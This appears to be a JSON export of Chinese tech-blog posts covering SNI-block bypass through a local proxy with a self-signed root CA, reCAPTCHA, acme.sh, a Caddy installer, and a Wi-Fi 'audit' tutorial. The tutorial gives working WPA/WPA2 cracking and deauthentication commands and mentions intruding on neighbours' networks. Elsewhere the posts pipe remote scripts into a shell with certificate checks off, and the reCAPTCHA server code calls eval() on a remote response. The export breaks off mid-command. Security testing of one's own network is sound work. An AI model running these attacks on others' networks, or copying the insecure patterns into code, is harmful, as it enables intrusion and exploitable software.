[{"title":"使用简单方法解决SNI阻断问题","date":"2020-02-21T07:58:33.000Z","date_formatted":{"ll":"2020年2月21日","L":"2020/02/21","MM-DD":"02-21"},"updated":"2020-02-21T11:57:05.861Z","content":"SNI阻断技术简单介绍TLS 是一个伟大的技术，它确保了网络传输的内容不被中间人篡改。现在越来越多的网站正在使用 HTTPS（即 HTTP over TLS）来保护网页内容。与此同时，TLS 设计中的一个缺陷，却使得阻断 TLS 连接变得可控。\n在建立新的 TLS 连接时，客户端（如浏览器）发出的第一个握手包（称为 Client Hello）中，包含了想要访问的域名信息（称为 SNI，Server Name Indication）。某些服务器（比如 CDN）会同时支持多个域名，在加密传输之前，它需要知道客户端访问的是哪个域名。于是 SNI 必须以明文的方式传输。并且由于浏览器并不知道服务器是否需要 SNI，浏览器会对所有的 TLS 握手都加入 SNI。\n于是，大家都懂的。根据黑名单，某些防火墙对于 TLS 连接可以进行精确地阻断。\n目前 Mozilla 和 CloudFlare 主导了一项对 SNI 的改进方案，称为 Encrypted SNI (ESNI)。这个提案还在早期的讨论状态中，目测还需要两年时间才可以定稿和推广。现阶段只有 Firefox Nightly（客户端），以及 CloudFlare 和 Wikipedia（网站）支持初代的 ESNI。\n在 ESNI 正式推广之前，我们还需要其它的技术来避开对于 TLS 连接的探测。\n目前我们还没有发现通用的解决方案。有一个较为通用的，但部署起来略麻烦的方案称为 Domain Fronting (域前置，又叫域名幌子)。它的原理简单来说是这样的：部分服务器允许 TLS 连接说自己需要域名 A，但之后的 HTTP 协议说自己需要域名 B。或者服务器压根就不看 SNI 的信息。在这种情况下，对于一个黑名单的域名， 我们在建立 TLS 的时候，可以选用一个不在黑名单的域名，绕过对 TLS 连接的监测。\n当然，它的缺点是，依赖于服务器行为。也就是说，每个不同的站点，可能都需要不同的策略（域名）。\n举两个例子：\nP 站的服务器实际上是不看 SNI 的。在建立 TLS 连接的时候，即使不携带 SNI，也可以正常进行 HTTPS 访问。\nzh.wikipedia.org 是一个黑名单域名，但同站点的 www.wikipedia.org 就不是。我们在建立 TLS 连接时，使用 SNI = www.wikipedia.org ，之后的 HTTP 请求依然可以正常连到 zh.wikipedia.org。\n顺便说一句，Domain Fronting 实际上不是一个合理的用法，网站完全可以拒绝这类连接，比如 Google 和 Amazon 就主动在自己的所有服务中拒绝这项技术。即使这样，Domain Fronting 依然是在 ESNI 之前最好的绕过技术。\n下面我们将使用一个工具来解决SNI阻断问题\n过程在看此教程之前，请确保你已经安装了OpenSSL，具体安装过程不再详述，可以在 CMD/Powershell/bash/Terminal 中输入openssl,如果出现OpenSSL&gt;字样，说明已经安装\n创建自签名CA证书使用 CMD/Powershell/bash/Terminal 等命令行工具打开任意文件夹，依次输入下面的命令\n（其中的openssl.cnf可以在openssl的安装处找到，如果没有可以下载这个，放在命令行工具打开的文件夹下)\n12345678# 生成根证书私钥(key文件)openssl genrsa -out ca.key 2048# 生成根证书签发申请文件(csr文件，申请过程可一路回车)openssl req -new -key ca.key -out ca.csr -config ./openssl.cnf# 自签发根证书(crt文件)openssl x509 -req -days 3650 -in ca.csr -signkey ca.key -out ca.crt# 生成pem格式证书cat ca.crt ca.key &gt; ca.pem\nWindows下可以直接打开ca.crt文件并安装证书，Linux等系统请自行根据版本进行安装。还可以通过浏览器来进行安装（系统直接安装和浏览器安装二选一），这里以Chromium系浏览器为例。\n在设置中搜索证书：\n\n点击管理证书后面的按钮，并找到“受信任的根证书颁发机构”：\n\n导入刚才的ca.crt即可，之后Windows系统需要重启才能使证书生效，Linux请根据实际情况进行操作。\n通过工具解决SNI阻断\n下载地址 https://github.com/bypass-GFW-SNI/main/releases\n\n\n或使用这个地址 https://www.lanzous.com/b0bec39pa 密码:hwmy\n\n根据你的系统进行下载，Linux系统需要给文件777权限\n同时下载这个文件 https://www.lanzous.com/i9jthcb\n将下载的文件放入刚才生成证书的文件夹，使用命命令行工具执行下面的命令\n1234# Windows.\\bypass-v1.2-windows-amd64.exe -c .\\ca.pem -k .\\ca.key -l .\\domain.conf# Linux .\\bypass-v1.2-linux-amd64 -c .\\ca.pem -k .\\ca.key -l .\\domain.conf\n如果提示&quot;listen tcp [::1]:443: bind: An attempt was made to access a socket in a way forbidden by its access permissions.&quot;则是443端口被占用，请自行搜索解决\n最后设置以下两个方法二选一，都可以达到目的\n将本机的DNS设置为 127.0.0.1 设置方法请自行搜索解决\n设置hosts 可以下载 这个 文件，用记事本打开，搜索相关网站（如pixiv等），将前面的IP改为 127.0.0.1，效果如下：\n\n保存，然后Windows需要替换C:/WINDOWS/system32/drivers/etc/hosts这个文件为刚刚改动的文件，Linux需要替换/etc/hosts这个文件为刚刚改动的文件，之后Windows可以在命令行工具中执行ipconfig /flushdns刷新dns缓存，Linux需要执行/etc/init.d/networking restart重启网络，之后可以通过浏览器连接某些网站（如p站）来测试效果。\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/75579060_p0.jpg","plink":"https://gwliang.com/2020/02/21/remove-sni-block/"},{"title":"在中国国内使用Google reCAPTCHA 2/3 验证码的方法","date":"2020-02-13T10:36:51.000Z","date_formatted":{"ll":"2020年2月13日","L":"2020/02/13","MM-DD":"02-13"},"updated":"2020-02-15T14:19:34.406Z","content":"我看版本2的有人说了，我简单的说一下版本3的使用和集成\n国内使用reCAPTCHA只需要将 www.google.com 替换成 www.recaptcha.net，即可在国内使用 recaptcha 的服务。\n如 https://www.google.com/recaptcha/api.js 替换成 https://www.recaptcha.net/recaptcha/api.js，https://www.google.com/recaptcha/api/siteverify 替换成 https://www.recaptcha.net/recaptcha/api/siteverify。\n浏览器界面请使用以下方法使用\n1234567891011&lt;script src=\"https://www.recaptcha.net/recaptcha/api.js?render=客户端代码\"&gt;&lt;/script&gt;&lt;script&gt;    //验证reCAPTCHA是否载入    grecaptcha.ready(function () &#123;        console.log(\"reCAPTCHA载入成功\")    &#125;);    //生成特征验证码    grecaptcha.execute('客户端代码', &#123;action: 'homepage'&#125;).then(function(token) &#123;           &#125;);&lt;/script&gt;\n\n这里给一个比较完整的例子，以JavaScript和python(flask)为例\n客户端代码 JavaScript123456789101112131415161718192021222324252627282930313233&lt;script src=\"https://www.recaptcha.net/recaptcha/api.js?render=客户端代码\"&gt;&lt;/script&gt;&lt;script src=\"//cdn.jsdelivr.net/combine/gh/jquery/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt;    grecaptcha.ready(function () &#123;        console.log(\"reCAPTCHA载入成功\")    &#125;);    $('#submit').click(function () &#123;        var d = &#123;&#125;;        var t = $('form').serializeArray();        $.each(t, function () &#123;            d[this.name] = this.value;        &#125;);        console.log(d)        grecaptcha.execute('客户端代码', &#123; action: 'homepage' &#125;).then(function (token) &#123;            d[\"recaptcha\"] = token            $.ajax(&#123;                type: 'post',                data: d,                url: 'verify',                cache: false,                dataType: 'text',                success: function (data) &#123;                    if (data == \"1\") &#123;                        $(\"#ok\").text(\"通过验证，您不是机器人\")                    &#125; else &#123;                        $(\"#ok\").text(\"未通过验证，请重新测试\")                    &#125;                    console.log(data)                &#125;            &#125;)        &#125;)    &#125;);&lt;/script&gt;\n\n服务器端代码 Python(Flask)123456789101112131415161718@app.route('/verify', methods=['POST'])def verify():    if request.method == 'POST':        verification = request.form['recaptcha']        datas = &#123;            'secret': \"服务器端代码\",            'response': verification        &#125;        k = requests.post(            \"https://recaptcha.net/recaptcha/api/siteverify\", data=datas)        print(k.text)        kk = eval(k.text.replace('\"', \"'\").replace(            'true', \"1\").replace('false', \"2\"))        if kk[\"success\"] == 1:            return \"1\"        else:            return \"0\"\n\n同时可使用下面的命令对右下角的标志进行隐藏\n12345678910111213141516&lt;style&gt;.grecaptcha-badge &#123;\t\tvisibility: hidden !important;    &#125;&lt;/style&gt;&lt;!-- 但是谷歌强烈建议在网站上保留下面的标识 --&gt;&lt;small&gt;This site is protected by reCAPTCHA and the Google  &lt;a href=\"https://policies.google.com/privacy\"&gt;Privacy Policy&lt;/a&gt; and &lt;a href=\"https://policies.google.com/terms\"&gt;Terms of Service&lt;/a&gt; apply.&lt;/small&gt;&lt;!-- 自行翻译的中文版 --&gt;&lt;small&gt;本网站受RECAPTCHA和谷歌&lt;a href=\"https://policies.google.com/privacy\"&gt;隐私政策&lt;/a&gt;及&lt;a href=\"https://policies.google.com/terms\"&gt;服务条款&lt;/a&gt;的保护。&lt;/small&gt;\n\n完整例子下载地址https://www.lanzous.com/i9doidc\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/m_i3384843040.jpg","plink":"https://gwliang.com/2020/02/13/use-recaptcha-in-china/"},{"title":"查看你在B站注册的时间","date":"2020-02-12T03:01:24.000Z","date_formatted":{"ll":"2020年2月12日","L":"2020/02/12","MM-DD":"02-12"},"updated":"2020-02-13T12:28:14.397Z","content":"查看你在B站注册的时间请按步骤操作\n登录你的B站账号（如果你在客户端里打开那默认就是已经登录了）\n点击下面的网页\nhttps://member.bilibili.com/x2/creative/h5/calendar/event?ts=0\n\n\n\n\n\n复制中间部分（或者全部复制,电脑端建议全部复制）\n手机端长按vip 或 identification 就能选中那一大块\n\n\n\n如果你是手机端，请使用回退键（或者全面屏的手势），不要点击上面的×，这样你要重新再点进来\n粘贴到下面的输入框中\n\n  请输入复制的代码\n  \n\n\n\n\n你的注册时间是 \n\n\n原理刚才取出的数据中，其中有一段是&quot;jointime&quot;:******，后面跟的就是你的注册时间，只不过这个是时间戳，我原来的视频里讲到过。\n时间戳是指格林威治时间1970年01月01日00时00分00秒(北京时间1970年01月01日08时00分00秒)起至现在的总毫秒数。（现在取出来的是秒时间戳）经过换算就能得出你具体的注册时间\n声明本网站为静态网站，不会记录你的任何信息，请放心使用\n\nvar timestamp=0,sign=false\n$(\"head\").prepend('');$(\"head\").prepend('');$.getScript(\"//cdnjs.cloudflare.com/ajax/libs/mdui/0.4.3/js/mdui.min.js\")\n$.getScript(\"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/moment.min.js\",function(){$.getScript(\"https://cdn.jsdelivr.net/gh/codebox/moment-precise-range/moment-precise-range.min.js\");$(\"#open\").html(`在本页面打开\n手机端需要自己找到\"level\"、\"vip\"、\"identification\"位置，长按其中任意一个单词，复制即可；电脑端点击代码窗口后，按下Ctrl+A然后按下Ctrl+C即可全部复制`)});function transformTime(timestamp){if(timestamp){var time=new Date(timestamp);var y=time.getFullYear();var M=time.getMonth()+1;var d=time.getDate();var h=time.getHours();var m=time.getMinutes();var s=time.getSeconds();return y+'-'+addZero(M)+'-'+addZero(d)+' '+addZero(h)+':'+addZero(m)+':'+addZero(s);}else{return'';}}\nfunction addZero(m){return m","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/74269323.jpg","plink":"https://gwliang.com/2020/02/12/view-regtime-of-bilibili/"},{"title":"使用 acme.sh 申请 Let's Encrypt 泛域名SSL证书详细教程","date":"2020-02-04T12:08:11.000Z","date_formatted":{"ll":"2020年2月4日","L":"2020/02/04","MM-DD":"02-04"},"updated":"2020-02-04T14:37:17.310Z","content":"使用 acme.sh 申请 Let&#39;s Encrypt 泛域名SSL证书详细教程acme.shacme.sh是一个实现了 acme 协议的脚本，可以从 Let&#39;s Encrypt 生成免费的SSL证书\n本文只给出配合解析商 API 申请泛域名证书的过程教程，acme.sh还有很多很强大的功能例如配合 Nginx 或者 Apache 等自动申请证书，请自行查看 github 项目 wiki 发掘\nhttps://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E\n部署 acme.sh123curl https://get.acme.sh | sh# 或者wget -O- https://get.acme.sh | sh\n获取 Cloudflare 的 API 信息acme.sh目前支持 cloudflare, dnspod, cloudxns, godaddy 以及 ovh 等数十种解析商的 API，可以自动添加 TXT 记录来验证，不需要人工操作，十分便捷\n详细可以看\nhttps://github.com/Neilpang/acme.sh/blob/master/dnsapi/README.md\n这里以 Cloudflare 为例，CloudFlare Domain API提供了两种自动颁发证书的方法。\n使用全局API密钥首先，您需要登录到CloudFlare帐户以获取全局API密钥。\n\n然后根据你的API密钥来填写下面的命令，并在服务器里执行\n12export CF_Key&#x3D;&quot;sdfsdfsdfljlbjkljlkjsdfoiwje&quot;export CF_Email&#x3D;&quot;xxxx@sss.com&quot;\n其中CF_Key是你的Global API Key，CF_Email是你注册cloudflare的邮箱。\n使用新的cloudflare API令牌12export CF_Token&#x3D;&quot;sdfsdfsdfljlbjkljlkjsdfoiwje&quot;export CF_Account_ID&#x3D;&quot;xxxxxxxxxxxxx&quot;\n没试过，只会第一种\n其他解析商的环境变量名是不一样的，详情去这里看\nhttps://github.com/Neilpang/acme.sh/blob/master/dnsapi/README.md\n这个临时环境变量只需配置这一次，当成功申请证书后，API 信息会被自动保存在~/.acme.sh/account.conf，下次你使用acme.sh的时候会被自动使用\n开始申请证书接下来正式开始申请泛域名证书，将example.com换成你自己的域名\n1~&#x2F;.acme.sh&#x2F;acme.sh --issue --dns dns_cf -d example.com -d &#39;*.example.com&#39;\n--dns dns_cx参数表示使用 CloudXNS 的 API，如果是其他解析商，同样的，从上面那个链接可以看到对应参数\n然后静静等待即可\n得到证书申请完成后屏显会输出证书路径\n证书是fullchain.cer\n密匙是example.com.key\n由于证书默认（在你没安装宝塔等同样调用 acme 签发证书的面板时）会在 acme 的内部目录~/.acme.sh/中生成，不建议直接使用该路径填写至 nginx 等配置中，而是使用--installcert命令，具体请参考↓\nhttps://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E#3-copy%E5%AE%89%E8%A3%85-%E8%AF%81%E4%B9%A6\n关于证书续期Let&#39;s Encrypt 证书的有效期为三个月，acme.sh会每隔60天自动帮你续期，无需你进行任何干预\n如果你想强制续期或者取消自动续期可以看\nhttps://github.com/Neilpang/acme.sh#11-how-to-renew-the-certs\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/2020-02-04.png","plink":"https://gwliang.com/2020/02/04/acme-le-wc/"},{"title":"一个极简的HTTP Server： Caddy一键安装脚本，带网站配置教程","date":"2020-01-27T06:05:27.000Z","date_formatted":{"ll":"2020年1月27日","L":"2020/01/27","MM-DD":"01-27"},"updated":"2020-01-27T06:38:39.669Z","content":"一个极简的HTTP Server： Caddy一键安装脚本，带网站配置教程说明：这几天一直在看逗比根据地，发现Caddy很是强大，是一个极简的HTTP服务器，支持HTTP/2静态网页服务器，安装也很快，在很多方面都可以不用安装时间很长的lnmp，lamp环境了，配置文件也很简单，同时还有一些有趣的扩展，可以非常方便的搭建一个HTTP服务器。\n安装系统要求：CentOS 6+/Debian 6+/Ubuntu 14.04 +。推荐Debian 7 x64。\n本脚本只是一个一键安装+运行控制的脚本，没有其他管理虚拟主机等功能。\n执行下面的代码安装Caddy，如果想要安装其他扩展可以把名字加到命令后面（bash caddy_install.sh install xxx,xxx,xxx，扩展列表点击查看）。\n123wget -N --no-check-certificate https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ToyoDAdoubiBackup&#x2F;doubi&#x2F;master&#x2F;caddy_install.sh &amp;&amp; chmod +x caddy_install.sh &amp;&amp; bash caddy_install.sh#备用地址wget -N --no-check-certificate https:&#x2F;&#x2F;gwliang.com&#x2F;caddy_install.sh &amp;&amp; chmod +x caddy_install.sh &amp;&amp; bash caddy_install.sh\n\n使用说明12345678启动：&#x2F;etc&#x2F;init.d&#x2F;caddy start停止：&#x2F;etc&#x2F;init.d&#x2F;caddy stop重启：&#x2F;etc&#x2F;init.d&#x2F;caddy restart查看状态：&#x2F;etc&#x2F;init.d&#x2F;caddy status查看Caddy启动日志：tail -f &#x2F;tmp&#x2F;caddy.log安装目录：&#x2F;usr&#x2F;local&#x2F;caddyCaddy配置文件位置：&#x2F;usr&#x2F;local&#x2F;caddy&#x2F;CaddyfileCaddy自动申请SSL证书位置：&#x2F;.caddy&#x2F;acme&#x2F;acme-v01.api.letsencrypt.org&#x2F;sites&#x2F;xxx.xxx(域名)&#x2F;\n\n升级Caddy或者更新扩展只需要重新执行你当初安装时候用的命令即可，会覆盖安装最新的Caddy+扩展。\n卸载Caddy卸载不会删除虚拟主机的内容，只会删除Caddy自身和配置文件。\n123wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/caddy_install.sh &amp;&amp; bash caddy_install.sh uninstall#备用地址wget -N --no-check-certificate https://gwliang.com/caddy_install.sh &amp;&amp; bash caddy_install.sh uninstall\n\n网站配置文件配置文件为Caddyfile，列举几种caddy的conf的写法\n1、本地访问80\n1:80\n2、单网站访问\n123example.comroot &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;www&#x2F;&#x2F;更多模块\n2、多网站\n12345example.com &#123;  gzip  root &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;www  &#x2F;&#x2F;更多模块&#125;\n\n常用基本组成模块，均写入到conf站点配置中。\n1234567891011121314151617181920212223#log日志log &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;www&#x2F;example.log#目录访问browse#gzip压缩gzip#自主ssl证书tls &#x2F;path&#x2F;ssl&#x2F;example.com.crt &#x2F;path&#x2F;ssl&#x2F;example.com.key#访问口令认证（用户emiria，密码abc123）basicauth &#x2F; emiria abc123#跳转功能redir http:&#x2F;&#x2F;example.com&#123;url&#125;#自定义错误页面errors &#123;  404 404.html  500 &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;www&#x2F;500.html&#125;\n例如，通过IP即80端口访问目录：\n12345:80 &#123;  root &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;www  gzip  browse&#125;\n也可以直接执行命令写入，以下是一个命令，直接复制粘贴即可。\n12345echo &quot;:80 &#123;  root &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;www  gzip  browse&#125;&quot; &gt; &#x2F;usr&#x2F;local&#x2F;caddy&#x2F;Caddyfile\n更多配置参考：https://caddyserver.com/tutorial/caddyfile\n设置文档参考：https://caddyserver.com/docs\n常见问题1、Caddy启动失败，打开ip访问地址显示的是 It works !\n一些系统会自带apache2，而apache2会占用80端口，导致Caddy无法绑定端口，所以只要关掉就好了。\n12netstat -lntp# 我们可以通过这个命令查看是不是被其他软件占用了80端口。\n不过apache2会默认开机自启动，如果不需要可以关闭自启动或者卸载apache2。\n停止Apache2\n1234567# CentOS系统&#x2F;etc&#x2F;init.d&#x2F;httpd stop# Debian&#x2F;Ubuntu系统&#x2F;etc&#x2F;init.d&#x2F;apache2 stop # 尝试使用上面代码关闭，如果没效果或者提示什么错误无法关闭，那就用下面这个强行关闭进程。kill -9 $(ps -ef|grep &quot;apache2&quot;|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;)\n取消开机自启动\n1234# CentOS 系统chkconfig --del httpd# Debian&#x2F;Ubuntu 系统update-rc.d -f apache2 remove\n卸载Apache2\n1234# CentOS 系统yum remove httpd# Debian&#x2F;Ubuntu 系统apt-get remove --purge apache2\n关闭Apache2后，就可以尝试启动Caddy，并试试能不能打开网页。\n1&#x2F;etc&#x2F;init.d&#x2F;caddy start\n2、启动Caddy后，无法访问\n这个可能是防火墙的问题，开放防火墙端口即可。\n123456iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 端口 -j ACCEPTiptables -I INPUT -m state --state NEW -m udp -p udp --dport 端口 -j ACCEPT # 删除防火墙规则，内容一样把 -I 换成 -D 就行了：iptables -D INPUT -m state --state NEW -m tcp -p tcp --dport 端口 -j ACCEPTiptables -D INPUT -m state --state NEW -m udp -p udp --dport 端口 -j ACCEPT\n\n3、SSL证书签发失败\n比如报错acme: error: 400 :: urn:ietf:params:acme:error:connection :: Error getting validation data, url:，检查下防火墙端口，需要开启80和443端口，然后重启即可。\n转载声明原文链接：https://www.moerats.com/archives/404/\n","thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/74664457_p0.jpg","plink":"https://gwliang.com/2020/01/27/caddy-install/"},{"title":"Wi-Fi 等无线网络安全审计方法","date":"2020-01-24T09:49:59.000Z","date_formatted":{"ll":"2020年1月24日","L":"2020/01/24","MM-DD":"01-24"},"updated":"2020-01-27T06:38:55.422Z","content":"Wi-Fi 破解利用 Airodump-ng 以及 Aircrack-ng / Hashcat 破解 WPA/WPA2 WI-FI 路由器。\n这是个简洁的教程，一步一步的描述了如何破解使用弱密码保护的 WI-FI 网络。它不会极尽其详，但是足够你用来测试自己的网络安全或者入侵附近网络。下面列出的攻击完全是被动式的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。不过一个可选的 deauthentication 攻击可以用于加速侦查过程，在文档末尾有描述。\n如果你熟悉这个过程，你可以跳过这段描述直接跳到底部使用的命令列表。更多种建议以及可行的方法，参考附录A。\n声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。\n入门这个教程假定你：\n可以流畅使用命令行\n使用一个基于debian的linux发行版本，最好是 Kali linux\n安装 Aircrack-ngsudo apt-get install aircrack-ng\n\n拥有一块支持监测模式的无线网卡（对于支持的设备列表，参考这里)\n破解一个WI-FI网络监测模式 (Monitor Mode)让我们通过下面的命令可以列出支持监测模式的无线接口开始：\n1airmon-ng\n\n如果你没有看到有接口列出，意味着你的无线网卡就不支持监测模式 😞\n我们将假设你的无线接口名称是 wlan0，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监测模式：\n1airmon-ng start wlan0\n\n运行 iwconfig。你现在应该能够看到列出一个新的监测模式接口（比如 mon0 或者 wlan0mon）。\n找到你的目标使用你的监测接口开始监听附近的 802.11 Beacon 帧广播：\n1airodump-ng mon0\n\n你应该可以看到类似于下面的输出。\n123456789101112131415CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                                                                                                                                                                        BSSID              PWR  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                                                               14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                    14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                           14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        &lt;length:  0&gt;                                                         14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro                                                           9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme                                                                  00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin&#39;s Awesome                                                    06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2                                                                  78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2                                                           9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT                                                     BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root                                                                 EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca\n\n出于这个演示的目的，我们将会破解我自己的网络，&quot;hackme&quot;。记住利用 airodump-ng 展示的 BSSID， MAC 地址以及信道（CH）号，在下一个步骤中我们将会需要它们。\n捕获 4-way HandshakeWPA/WPA2 使用 4-way Handshake 来认证设备连接网络。你不需要明白这些的含意，但是你必须抓取 handshake 才能破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及 bssid 值来使用 airmon-ng 来监视目标网络。\n123# 将 -c 以及 --bssid 值替换为你的目标网络值# -w 用来指定我们保存捕获到数据包的文件夹airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0\n12345CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                                                                                                                                                                     BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                                                             9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS\n\n现在让我们等一会儿... 当我们捕捉到一个握手时，你应该能够马上在屏幕的右上角看到类似于[ WPA handshake: bc:d3:c9:ef:d2:67的一些东西。\n如果你不想等，也不反感进行一次主动攻击，你可以强制设备连接到目标网络来重新连接，并且在目标网络中发送恶意 deauthentication 数据包。通常这样就可以抓到  4-way handshake 了。参考下面的 deauth 攻击章节 来获取关于此的信息。\n一旦你捕获了一个握手，按下 ctrl-c 来终止 airodump-ng。这是在你指定的 airodump-ng 输出目录下，应该看到一个用来保存捕获信息的.cap文件（比如叫做-01.cap）。我们将会使用这个捕获文件来破解网络密码。个人喜欢将这个文件重命名为当前正在尝试破解的网络名称：\n1mv ./-01.cap hackme.cap\n\n破解网络密码最后一个步骤是使用捕获的 handshake 数据来破解密码。如果你能够访问 GPU，我强烈建议你使用 hashcat 来破解密码。我已经创建了一个叫做 naive-hashcat 的简单工具可以让使用 hashcat 变得非常方便。如果你不能够访问 GPU，还有很多在线的 GPU 破解服务可以使用，比如 GPUHASH.me 或者 OnlineHashCrack 。你也可以常使用 Aircrack-ng 来进行 CPU 破解。\n注意下面的攻击方法都假设用户正在使用弱密码。现如今很多 WPA/WPA2 路由自带 12 位强随机密码，大部分用户都不会去更改。如果你去尝试破解这些密码，我建议你使用 Probable-Wordlists WPA-length 字典文件。\n使用 naive-hashcat 破解（推荐）在我们使用 naive-hashcat 破解密码之前，我们需要将我们的 .cap 文件转换成同等 hashcat 文件格式 .hccapx。你可以通过上传 .cap 文件到 https://hashcat.net/cap2hccapx/  或者直接使用 cap2hccapx 工具。\n1cap2hccapx.bin hackme.cap hackme.hccapx\n\n接着，下载并运行 naive-hashcat：\n12345678910# 下载git clone https://github.com/brannondorsey/naive-hashcatcd naive-hashcat# 下载 134MB rockyou 字典文件curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt# 破解！宝贝！破解！# 2500 是 hashcat 对于 WPA/WPA2 的哈希模式HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh\n\nNaive-hashcat 使用多种字典，规则，组合以及伪装（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到hackme.pot，因此不时要检查这个文件。一旦你破解这个密码，你将会在你的 POI_FILE 看到类似于下面的内容：\n1e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet\n\n最后两块被 : 分隔开来，分别是网络名称和密码。\n如果你想直接使用 hashcat 而不是 naive-hashcat 的话请参考这个页面。\n利用 Aircrack-ng 破解Aircrack-ng 可以用于在你的 CPU 上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的 rockyou 字典文件：\n12# 下载 134MB rockyou 字典文件curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n\n注意，如果网络密码不再这个单词文件话，你将不能破解密码。\n12# -a2 指定 WPA2，-b 是 BSSID，-w 是字典文件aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap\n\n如果密码被破解了，你将会在终端看到一个 KEY FOUND! 消息，后面跟着的文本就是网络密码。\n123456789101112131415161718                           Aircrack-ng 1.2 beta3             [00:01:49] 111040 keys tested (1017.96 k&#x2F;s)                   KEY FOUND! [ hacktheplanet ]Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89                  59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71                  2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73                  6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78                  8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4\n\nDeauth AttackDeauth 攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的 “发件人” 地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用airodump-ng进行侦听，就能捕获到 4-way handshake。\n使用 airodump-ng 监视特定接入点（使用 -c channel --bssid MAC），直到看到客户端（STATION）连接。 连接的客户端看起来像这样，64：BC：0C：48：97：F7 是客户端 MAC。\n123456789CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                                                                                                                                                                   BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                                                          9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                                                                                                                                                                   BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                                                                                                                           9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS\n\n现在，先不管这个正在运行的 airodump-ng ，打开一个新的终端。 我们用 aireplay-ng 命令向我们的受害者客户端发送伪造的解除认证数据包，强制其重新连接到网络，以便在此过程中抓取 handshake。\n12345# -0 2 指定了我们将发送 2 个解除认证的数据包。如果需要# 可以增加这个数字，但随之而来客户端网络可能中断，有被人注意到的风险。# -a 是接入点的 MAC# -c 是客户端的 MACaireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0\n\n你也可以选择得通过广播解除认证数据包到所有连接的客户端：\n12# 尽管不是所有的客户端都会响应广播解除认证aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 